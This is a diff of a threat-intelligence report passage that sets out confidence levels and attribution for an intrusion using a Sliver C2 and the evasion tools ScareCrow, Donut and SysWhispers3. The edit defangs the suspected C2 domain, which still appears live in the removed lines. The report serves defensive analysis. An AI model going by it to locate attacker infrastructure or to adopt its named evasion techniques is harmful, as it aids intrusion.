-**MODERATE**: the `sihost.exe` process-hollowing target, which I hold at 75 percent from the build log alone, not confirmed in live analysis. The Sliver teamserver listener location, which I hold at 70 percent, since the actual C2 may sit on separate infrastructure if `mailuxe.net` resolves elsewhere. My judgment that this is a single, distinct threat actor rather than multiple operators sharing the same toolchain, which I hold at 68 percent. Five of the Section 7 ATT&CK rows carry this label, covering user execution of the lure file, process ghosting, module stomping, indicator removal via delayed file deletion, and process discovery ahead of PID spoofing.
+**MODERATE**: the `sihost.exe` process-hollowing target, which I hold at 75 percent from the build log alone, not confirmed in live analysis. The Sliver teamserver listener location, which I hold at 70 percent, since the actual C2 may sit on separate infrastructure if `mailuxe[.]net` resolves elsewhere. My judgment that this is a single, distinct threat actor rather than multiple operators sharing the same toolchain, which I hold at 68 percent. Five of the Section 7 ATT&CK rows carry this label, covering user execution of the lure file, process ghosting, module stomping, indicator removal via delayed file deletion, and process discovery ahead of PID spoofing.
 
 **LOW**: the competing hypothesis that this is a state-sponsored operator using commodity tools as cover, which I hold at 5 percent against the 80 percent I give the cybercrime hypothesis and the 15 percent I give a skilled individual criminal.
 
-**INSUFFICIENT**: named attribution to a known threat group. Research found no infrastructure overlap with any previously reported campaign, `mailuxe.net` carries no prior malicious history, the hosting provider serves thousands of unrelated domains, and the build-pipeline fingerprint (ScareCrow, Donut, SysWhispers3) is consistent with multiple independent operators using the same public tools. That is why I designate the operator **<a href="/actors/UTA-2026-001/">UTA-2026-001</a>** rather than name an actor.
+**INSUFFICIENT**: named attribution to a known threat group. Research found no infrastructure overlap with any previously reported campaign, `mailuxe[.]net` carries no prior malicious history, the hosting provider serves thousands of unrelated domains, and the build-pipeline fingerprint (ScareCrow, Donut, SysWhispers3) is consistent with multiple independent operators using the same public tools. That is why I designate the operator **<a href="/actors/UTA-2026-001/">UTA-2026-001</a>** rather than name an actor.
 
 ---
 
